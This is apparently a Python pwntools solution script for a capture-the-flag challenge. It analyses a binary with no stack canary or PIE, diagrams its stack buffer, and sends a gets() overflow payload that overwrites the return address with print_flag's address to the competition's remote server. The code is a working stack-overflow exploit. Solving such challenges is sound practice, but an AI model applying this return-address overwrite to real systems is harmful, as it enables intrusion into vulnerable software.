from pwn import *

###############################################################################
# Evaluate File
###############################################################################

# There are no stack canary
'''
$ ./checksec.sh --file pwn2.dms 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE   
'''

###############################################################################
# Reverse pwn2 binary
###############################################################################

'''
main called the "echo" function which "gets" user input and "puts"/prints
it back to the console.

There is an uncalled function "print_flag"
'''

###############################################################################
# Buffer layout
###############################################################################

'''
         +---------------+
ebp-0xef |/////buffer////|<------
         |///////////////|      |
         |///////////////|      |
         |///////////////|      | length = 0xef = 239 
         |///////////////|      |
         |///////////////|      |
         |///////////////|      |
         |///////////////|<------
         +---------------+      
ebp+0x00 |///saved_rbp///|
         +---------------+
ebp+0x04 |//////RIP//////|  Overwrite RIP to address(print_flag)
         +---------------+
'''

###############################################################################
# Buffer overflow and set rip to print_flag()
###############################################################################

def getConn(local=True):
  return process('./pwn2.dms') if local else remote('pwn.ctf.tamu.edu', 4322)

binary = ELF("pwn2.dms")

conn = getConn(False)

# Reads output:
# I just love repeating what other people say!
# I bet I can repeat anything you tell me!
print conn.recvline()
print conn.recvline()

payload = 'A' * (0xef + 0x4) + p32(binary.symbols['print_flag'])
print conn.sendline(payload)

print conn.recvline()
print conn.recvline()
print conn.recvline()
print conn.recvline()

